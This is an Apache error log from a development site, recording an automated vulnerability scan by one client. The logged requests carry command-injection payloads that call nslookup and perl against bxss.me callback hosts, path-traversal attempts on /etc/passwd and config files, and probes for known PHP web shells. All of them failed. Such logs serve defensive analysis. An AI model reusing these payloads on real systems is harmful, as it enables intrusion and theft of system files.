[Wed Jul 07 19:27:45.658566 2021] [core:error] [pid 14379] (36)File name too long: [client 27.147.202.214:14921] AH00036: access to /;(nslookup hithasyobddjsa0b8f.bxss.me||perl -e "gethostbyname('hithasyobddjsa0b8f.bxss.me')")|(nslookup hithasyobddjsa0b8f.bxss.me||perl -e "gethostbyname('hithasyobddjsa0b8f.bxss.me')")&(nslookup hithasyobddjsa0b8f.bxss.me||perl -e "gethostbyname('hithasyobddjsa0b8f.bxss.me')")/ failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hithasyobddjsa0b8f.bxss.me||perl -e "gethostbyname('hithasyobddjsa0b8f.bxss.me')")|(nslookup hithasyobddjsa0b8f.bxss.me||perl -e "gethostbyname('hithasyobddjsa0b8f.bxss.me')")&(nslookup hithasyobddjsa0b8f.bxss.me||perl -e "gethostbyname('hithasyobddjsa0b8f.bxss.me')")')
[Wed Jul 07 19:27:46.158693 2021] [core:error] [pid 14488] [client 27.147.202.214:5981] AH00126: Invalid URI in request GET /css/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:27:46.304745 2021] [authz_core:error] [pid 14379] [client 27.147.202.214:14921] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/files/.htaccess
[Wed Jul 07 19:27:46.486646 2021] [core:error] [pid 14694] [client 27.147.202.214:12372] AH00126: Invalid URI in request GET /css/../../../web.config HTTP/1.1
[Wed Jul 07 19:27:46.523674 2021] [core:error] [pid 14370] [client 27.147.202.214:5974] AH00126: Invalid URI in request GET /js//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:27:46.524827 2021] [core:error] [pid 14356] [client 27.147.202.214:4064] AH00126: Invalid URI in request GET /js/../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:27:46.708717 2021] [core:error] [pid 14756] (36)File name too long: [client 27.147.202.214:7956] AH00036: access to /;(nslookup hithxypyauhqhd5194.bxss.me||perl -e "gethostbyname('hithxypyauhqhd5194.bxss.me')")|(nslookup hithxypyauhqhd5194.bxss.me||perl -e "gethostbyname('hithxypyauhqhd5194.bxss.me')")&(nslookup hithxypyauhqhd5194.bxss.me||perl -e "gethostbyname('hithxypyauhqhd5194.bxss.me')")/app.js failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hithxypyauhqhd5194.bxss.me||perl -e "gethostbyname('hithxypyauhqhd5194.bxss.me')")|(nslookup hithxypyauhqhd5194.bxss.me||perl -e "gethostbyname('hithxypyauhqhd5194.bxss.me')")&(nslookup hithxypyauhqhd5194.bxss.me||perl -e "gethostbyname('hithxypyauhqhd5194.bxss.me')")')
[Wed Jul 07 19:27:46.823972 2021] [core:error] [pid 14340] [client 27.147.202.214:5980] AH00126: Invalid URI in request GET /css/../../../package.json HTTP/1.1
[Wed Jul 07 19:27:46.853655 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/phpinfo.php' not found or unable to stat
[Wed Jul 07 19:27:47.104817 2021] [php7:error] [pid 14338] [client 27.147.202.214:4317] script '/var/www/html/dev.wilkescw.com/files/r57shell.php' not found or unable to stat
[Wed Jul 07 19:27:47.168301 2021] [core:error] [pid 13858] [client 27.147.202.214:12379] AH00126: Invalid URI in request GET /css/../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:27:47.236626 2021] [php7:error] [pid 14413] [client 27.147.202.214:12373] script '/var/www/html/dev.wilkescw.com/files/webadmin.php' not found or unable to stat
[Wed Jul 07 19:27:47.424145 2021] [php7:error] [pid 14456] [client 27.147.202.214:4318] script '/var/www/html/dev.wilkescw.com/files/r57.php' not found or unable to stat
[Wed Jul 07 19:27:47.437421 2021] [core:error] [pid 14715] [client 27.147.202.214:5982] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:27:47.490426 2021] [core:error] [pid 14493] [client 27.147.202.214:14738] AH00126: Invalid URI in request GET /js/../../../../web.config HTTP/1.1
[Wed Jul 07 19:27:47.571336 2021] [authz_core:error] [pid 14331] [client 27.147.202.214:12377] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/fonts/.htaccess~
[Wed Jul 07 19:27:47.744501 2021] [php7:error] [pid 14456] [client 27.147.202.214:4318] script '/var/www/html/dev.wilkescw.com/files/r58.php' not found or unable to stat
[Wed Jul 07 19:27:47.772929 2021] [core:error] [pid 14352] [client 27.147.202.214:14022] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:47.795351 2021] [php7:error] [pid 14427] [client 27.147.202.214:4308] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:47.834492 2021] [php7:error] [pid 14147] [client 27.147.202.214:12383] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:47.897120 2021] [authz_core:error] [pid 14331] [client 27.147.202.214:12377] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/fonts/.htaccess.old
[Wed Jul 07 19:27:48.040889 2021] [php7:error] [pid 14638] [client 27.147.202.214:12374] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:48.072121 2021] [php7:error] [pid 14456] [client 27.147.202.214:4318] script '/var/www/html/dev.wilkescw.com/files/pi.php' not found or unable to stat
[Wed Jul 07 19:27:48.072380 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/c99shell.php' not found or unable to stat
[Wed Jul 07 19:27:48.135692 2021] [php7:error] [pid 14379] [client 27.147.202.214:14921] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:48.143842 2021] [php7:error] [pid 14425] [client 27.147.202.214:4310] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:48.180489 2021] [php7:error] [pid 14427] [client 27.147.202.214:4308] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:48.366933 2021] [php7:error] [pid 14638] [client 27.147.202.214:12374] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:48.397110 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/c99.php' not found or unable to stat
[Wed Jul 07 19:27:48.445508 2021] [php7:error] [pid 14373] [client 27.147.202.214:14806] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:48.453748 2021] [php7:error] [pid 14379] [client 27.147.202.214:14921] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:48.460027 2021] [php7:error] [pid 14425] [client 27.147.202.214:4310] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:48.480007 2021] [core:error] [pid 14381] [client 27.147.202.214:14807] AH00126: Invalid URI in request GET /js/../../../../package.json HTTP/1.1
[Wed Jul 07 19:27:48.662559 2021] [core:error] [pid 14467] [client 27.147.202.214:14795] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:27:48.698642 2021] [php7:error] [pid 14638] [client 27.147.202.214:12374] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:48.710955 2021] [php7:error] [pid 14456] [client 27.147.202.214:4318] script '/var/www/html/dev.wilkescw.com/files/php.php' not found or unable to stat
[Wed Jul 07 19:27:48.727664 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/nstview.php' not found or unable to stat
[Wed Jul 07 19:27:48.787854 2021] [authz_core:error] [pid 14425] [client 27.147.202.214:4310] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/fonts/.htaccess.save
[Wed Jul 07 19:27:48.788769 2021] [php7:error] [pid 14331] [client 27.147.202.214:12377] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:48.830999 2021] [php7:error] [pid 14473] [client 27.147.202.214:5990] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:49.104882 2021] [php7:error] [pid 14427] [client 27.147.202.214:4308] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:49.105325 2021] [php7:error] [pid 14331] [client 27.147.202.214:12377] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:49.146457 2021] [php7:error] [pid 14473] [client 27.147.202.214:5990] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:49.384107 2021] [php7:error] [pid 14379] [client 27.147.202.214:14921] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:49.448658 2021] [php7:error] [pid 14427] [client 27.147.202.214:4308] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:49.476042 2021] [php7:error] [pid 14473] [client 27.147.202.214:5990] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:49.544660 2021] [php7:error] [pid 14717] [client 27.147.202.214:5989] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:49.576098 2021] [php7:error] [pid 14456] [client 27.147.202.214:4318] script '/var/www/html/dev.wilkescw.com/files/i.php' not found or unable to stat
[Wed Jul 07 19:27:49.623087 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/nst.php' not found or unable to stat
[Wed Jul 07 19:27:49.623468 2021] [php7:error] [pid 14638] [client 27.147.202.214:12374] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:49.717936 2021] [php7:error] [pid 14379] [client 27.147.202.214:14921] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:49.783290 2021] [php7:error] [pid 14427] [client 27.147.202.214:4308] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:49.805882 2021] [php7:error] [pid 14473] [client 27.147.202.214:5990] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:49.810712 2021] [php7:error] [pid 14373] [client 27.147.202.214:14806] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:49.823746 2021] [core:error] [pid 14384] [client 27.147.202.214:5988] AH00126: Invalid URI in request GET /css/../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:27:49.895223 2021] [php7:error] [pid 14453] [client 27.147.202.214:14748] script '/var/www/html/dev.wilkescw.com/files/test.php' not found or unable to stat
[Wed Jul 07 19:27:49.950786 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/rst.php' not found or unable to stat
[Wed Jul 07 19:27:50.067191 2021] [php7:error] [pid 14716] [client 27.147.202.214:12371] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:50.134960 2021] [php7:error] [pid 14373] [client 27.147.202.214:14806] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:50.135717 2021] [php7:error] [pid 14473] [client 27.147.202.214:5990] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:50.145637 2021] [core:error] [pid 14424] [client 27.147.202.214:14739] AH00126: Invalid URI in request GET /css/../../../../web.config HTTP/1.1
[Wed Jul 07 19:27:50.215917 2021] [php7:error] [pid 14147] [client 27.147.202.214:12383] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:50.218289 2021] [php7:error] [pid 14427] [client 27.147.202.214:4308] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:50.221959 2021] [php7:error] [pid 14453] [client 27.147.202.214:14748] script '/var/www/html/dev.wilkescw.com/files/temp.php' not found or unable to stat
[Wed Jul 07 19:27:50.278281 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/r57eng.php' not found or unable to stat
[Wed Jul 07 19:27:50.391015 2021] [php7:error] [pid 14716] [client 27.147.202.214:12371] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:50.470940 2021] [core:error] [pid 14473] [client 27.147.202.214:5990] AH00126: Invalid URI in request GET /css/../../../../package.json HTTP/1.1
[Wed Jul 07 19:27:50.472216 2021] [php7:error] [pid 14373] [client 27.147.202.214:14806] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:50.477106 2021] [php7:error] [pid 14333] [client 27.147.202.214:14792] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:50.513890 2021] [php7:error] [pid 14453] [client 27.147.202.214:14748] script '/var/www/html/dev.wilkescw.com/files/info.php' not found or unable to stat
[Wed Jul 07 19:27:50.584773 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/shell.php' not found or unable to stat
[Wed Jul 07 19:27:50.622811 2021] [php7:error] [pid 14379] [client 27.147.202.214:14921] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:50.681880 2021] [php7:error] [pid 14716] [client 27.147.202.214:12371] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:50.785470 2021] [php7:error] [pid 14339] [client 27.147.202.214:1451] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:50.839463 2021] [php7:error] [pid 14333] [client 27.147.202.214:14792] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:50.940269 2021] [php7:error] [pid 14453] [client 27.147.202.214:14748] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:50.952435 2021] [php7:error] [pid 14379] [client 27.147.202.214:14921] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:51.013244 2021] [php7:error] [pid 14716] [client 27.147.202.214:12371] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:51.099421 2021] [core:error] [pid 14494] [client 27.147.202.214:9881] AH00126: Invalid URI in request GET /js/../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:27:51.110190 2021] [php7:error] [pid 14413] [client 27.147.202.214:12373] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:51.117583 2021] [php7:error] [pid 14427] [client 27.147.202.214:4308] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:51.143508 2021] [php7:error] [pid 14147] [client 27.147.202.214:12383] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:51.162577 2021] [php7:error] [pid 14333] [client 27.147.202.214:14792] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:51.259781 2021] [php7:error] [pid 14453] [client 27.147.202.214:14748] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:51.418901 2021] [core:error] [pid 14340] [client 27.147.202.214:9948] AH00126: Invalid URI in request GET /css/../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:27:51.424576 2021] [php7:error] [pid 14413] [client 27.147.202.214:12373] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:51.425686 2021] [core:error] [pid 14351] [client 27.147.202.214:14924] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:51.428961 2021] [php7:error] [pid 14427] [client 27.147.202.214:4308] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:51.448501 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/dra.php' not found or unable to stat
[Wed Jul 07 19:27:51.449524 2021] [php7:error] [pid 14333] [client 27.147.202.214:14792] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:51.544774 2021] [php7:error] [pid 14453] [client 27.147.202.214:14748] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:51.672954 2021] [php7:error] [pid 14716] [client 27.147.202.214:12371] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:51.731856 2021] [php7:error] [pid 14427] [client 27.147.202.214:4308] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:51.732885 2021] [php7:error] [pid 14413] [client 27.147.202.214:12373] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:51.740366 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/r.php' not found or unable to stat
[Wed Jul 07 19:27:51.787461 2021] [php7:error] [pid 13858] [client 27.147.202.214:9971] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:51.830363 2021] [php7:error] [pid 14453] [client 27.147.202.214:14748] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:52.042992 2021] [php7:error] [pid 14379] [client 27.147.202.214:14921] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:52.058487 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/lol.php' not found or unable to stat
[Wed Jul 07 19:27:52.129938 2021] [php7:error] [pid 14370] [client 27.147.202.214:9914] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:52.134413 2021] [php7:error] [pid 14715] [client 27.147.202.214:9981] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:52.158602 2021] [core:error] [pid 14457] (36)File name too long: [client 27.147.202.214:5991] AH00036: access to /icons/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/usr/share/apache2/icons/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:27:52.287795 2021] [authz_core:error] [pid 14369] [client 27.147.202.214:9910] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/admin/.htaccess~
[Wed Jul 07 19:27:52.386053 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/zehir.php' not found or unable to stat
[Wed Jul 07 19:27:52.608503 2021] [core:error] [pid 14338] [client 27.147.202.214:4317] AH00126: Invalid URI in request GET /js/../../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:27:52.612483 2021] [authz_core:error] [pid 14369] [client 27.147.202.214:9910] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/admin/.htaccess.old
[Wed Jul 07 19:27:52.630837 2021] [php7:error] [pid 14356] [client 27.147.202.214:14837] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:52.713411 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/c-h.v2.php' not found or unable to stat
[Wed Jul 07 19:27:52.769385 2021] [php7:error] [pid 14370] [client 27.147.202.214:9914] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:52.832765 2021] [core:error] [pid 14717] [client 27.147.202.214:5989] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:27:52.915208 2021] [php7:error] [pid 14453] [client 27.147.202.214:14748] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:52.934946 2021] [authz_core:error] [pid 14410] [client 27.147.202.214:10019] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/admin/.htaccess.save
[Wed Jul 07 19:27:52.937757 2021] [core:error] [pid 14369] [client 27.147.202.214:9910] AH00126: Invalid URI in request GET /js/../../../../../web.config HTTP/1.1
[Wed Jul 07 19:27:53.034059 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/php-backdoor.php' not found or unable to stat
[Wed Jul 07 19:27:53.172840 2021] [core:error] [pid 14370] [client 27.147.202.214:9914] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:53.232044 2021] [php7:error] [pid 14453] [client 27.147.202.214:14748] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:53.253207 2021] [core:error] [pid 14715] [client 27.147.202.214:9981] AH00126: Invalid URI in request GET /js/../../../../../package.json HTTP/1.1
[Wed Jul 07 19:27:53.343505 2021] [core:error] [pid 14352] [client 27.147.202.214:9997] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:27:53.362869 2021] [php7:error] [pid 14395] [client 27.147.202.214:5971] script '/var/www/html/dev.wilkescw.com/files/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 19:27:53.397067 2021] [php7:error] [pid 14379] [client 27.147.202.214:14921] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:53.577423 2021] [core:error] [pid 14410] [client 27.147.202.214:10019] AH00126: Invalid URI in request GET /js/../../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:27:53.580599 2021] [php7:error] [pid 14493] [client 27.147.202.214:9984] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:53.749511 2021] [core:error] [pid 13858] [client 27.147.202.214:9971] AH00126: Invalid URI in request GET /css/../../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:27:53.901863 2021] [core:error] [pid 14379] (36)File name too long: [client 27.147.202.214:14921] AH00036: access to /js/;(nslookup hittnwraeiakzf1966.bxss.me||perl -e "gethostbyname('hittnwraeiakzf1966.bxss.me')")|(nslookup hittnwraeiakzf1966.bxss.me||perl -e "gethostbyname('hittnwraeiakzf1966.bxss.me')")&(nslookup hittnwraeiakzf1966.bxss.me||perl -e "gethostbyname('hittnwraeiakzf1966.bxss.me')").js failed (filesystem path '/var/www/html/dev.wilkescw.com/js/;(nslookup hittnwraeiakzf1966.bxss.me||perl -e "gethostbyname('hittnwraeiakzf1966.bxss.me')")|(nslookup hittnwraeiakzf1966.bxss.me||perl -e "gethostbyname('hittnwraeiakzf1966.bxss.me')")&(nslookup hittnwraeiakzf1966.bxss.me||perl -e "gethostbyname('hittnwraeiakzf1966.bxss.me')").js')
[Wed Jul 07 19:27:53.907167 2021] [php7:error] [pid 14493] [client 27.147.202.214:9984] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:54.029145 2021] [php7:error] [pid 14427] [client 27.147.202.214:4308] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:27:54.738908 2021] [core:error] [pid 14365] [client 27.147.202.214:4204] AH00126: Invalid URI in request GET /css/../../../../../web.config HTTP/1.1
[Wed Jul 07 19:27:55.060430 2021] [core:error] [pid 14453] [client 27.147.202.214:14748] AH00126: Invalid URI in request GET /css/../../../../../package.json HTTP/1.1
[Wed Jul 07 19:27:55.070956 2021] [php7:error] [pid 14493] [client 27.147.202.214:9984] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:55.783126 2021] [core:error] [pid 14427] [client 27.147.202.214:4308] AH00126: Invalid URI in request GET /css/../../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:27:57.705018 2021] [core:error] [pid 14493] (36)File name too long: [client 27.147.202.214:9984] AH00036: access to /js/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/var/www/html/dev.wilkescw.com/js/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Wed Jul 07 19:27:58.071667 2021] [core:error] [pid 14638] [client 27.147.202.214:12374] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:27:58.089181 2021] [php7:error] [pid 14333] [client 27.147.202.214:14792] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:58.090745 2021] [core:error] [pid 14425] [client 27.147.202.214:4310] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:27:58.403093 2021] [core:error] [pid 14716] [client 27.147.202.214:12371] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:58.734232 2021] [core:error] [pid 14369] [client 27.147.202.214:6519] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:59.872459 2021] [negotiation:error] [pid 14457] [client 27.147.202.214:1621] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/dev.wilkescw.com/admin/classes (None could be negotiated).
[Wed Jul 07 19:28:00.856521 2021] [core:error] [pid 14384] [client 27.147.202.214:1413] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
